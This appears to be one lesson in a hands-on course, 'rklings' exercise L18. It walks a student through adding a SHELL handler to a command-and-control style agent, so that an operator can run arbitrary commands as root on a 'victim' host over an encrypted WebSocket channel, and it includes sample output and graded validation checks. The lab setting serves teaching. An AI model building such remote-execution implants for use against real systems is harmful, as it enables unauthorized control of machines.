# L18: Remote Shell

## Mission

Add a `SHELL` handler that runs one command and returns its output as a
structured JSON result over the encrypted WebSocket channel.

L17 dispatches commands that map to mkdir calls, but an operator needs to run
arbitrary shell commands on the target.
One new handler adds remote execution.

## What you will observe

- `SHELL id` returns root identity as a JSON object with stdout and exit code
- Shell pipelines and redirections retain their normal meaning
- A nonexistent command returns its exit code without breaking the WebSocket
  session

## Workspace

```text
exercises/L18-remote-shell
├── go.mod
├── go.sum
└── main.go
```

The crypto, transport, WebSocket session loop, and existing handlers are all
provided.
Only add `handleShellCmd` and register it in the execute() switch.

## exec.Command

Go's `os/exec` package runs external programs.
`exec.Command("/bin/sh", "-c", arg)` passes the entire argument string to `sh`,
which handles pipes, redirects, globs, and everything else the shell provides.

`CombinedOutput()` runs the command, waits for it to finish, and returns stdout
and stderr together as a byte slice.

## Structured results

Each handler returns a Go value.
The transport encrypts the result as JSON and sends it back to the operator over
the WebSocket.
For SHELL, the result is a map with two fields:

```json
{
  "stdout": "uid=0(root) gid=0(root) groups=0(root)\n",
  "exit_code": 0
}
```

On error, `exit_code` is nonzero and `stdout` still contains whatever the
command produced before failing.
Use `exec.ExitError` to extract the real exit code from the error; default to -1
for other error types.

```text
  Operator                         Agent
    |                                |
    |--- encrypted command --------->|
    |    cmd: SHELL id               |
    |                                |  sh -c "id"
    |                                |  output: "uid=0(root)...\n"
    |<-- encrypted result -----------|
    |    {"stdout":"uid=0...",       |
    |     "exit_code":0}             |
```

## Response algorithm

Implement the handler in this order without copying a completed handler:

1. Execute `/bin/sh -c <argument>` and retain combined stdout and stderr.
2. If the command succeeded, return exit_code 0.
3. If it failed, extract the exit code from exec.ExitError (or use -1).
4. Always include the captured output in stdout, even on failure.
5. Return the result as a map.
   The transport layer handles JSON serialization.

## TODOs

```text
TODO 1  main.go  implement handleShellCmd
TODO 2  main.go  add a SHELL case to execute()
```

### TODO 1 -- Implement handleShellCmd

Write `handleShellCmd(arg string) any` following the response algorithm above:

1. Run `/bin/sh -c <argument>` with `exec.Command` and `CombinedOutput()`.
2. On success, return `map[string]any{"stdout": string(out), "exit_code": 0}`.
3. On error, extract the exit code with `exec.ExitError`.
   Return the map with the captured output and the nonzero exit code.

### TODO 2 -- Add SHELL case to execute()

Add `case "SHELL": return handleShellCmd(cmd.Arg)` to the switch in `execute()`
so the dispatch routes SHELL commands to your handler.

## Test it

`rklings serve L18` starts this exercise's live one-shot execution panel at
`http://127.0.0.1:8080`.
Output shown there is returned by the guest agent.

```console
$ ./rklings serve L18
```

In another host terminal:

```console
$ ./rklings run L18
```

Open `http://127.0.0.1:8080`.
Enter a command in the shell field.
The output and exit code shown by the panel come from the guest process.

```text
server> SHELL id
agent:  {"stdout":"uid=0(root) gid=0(root) groups=0(root)\n","exit_code":0}
server> SHELL cat /etc/hostname
agent:  {"stdout":"victim\n","exit_code":0}
server> SHELL ls /nonexistent
agent:  {"stdout":"ls: cannot access '/nonexistent': No such file or directory\n","exit_code":2}
server> PING
agent:  PONG
```

Stop `run` and `serve` with `Ctrl+C` when finished.

## Validate

```console
$ ./rklings validate L18
  [+] SHELL id returns uid=0
  [+] SHELL handles pipes and redirects
  [+] SHELL reports nonexistent command error
  [+] PING still works alongside SHELL
  PASS
```

## Next

You can execute commands remotely, but moving a binary or retrieving a file is
still awkward.
L19 adds file transfer: chunked binary downloads streamed over the encrypted
channel, and JSON-based uploads.
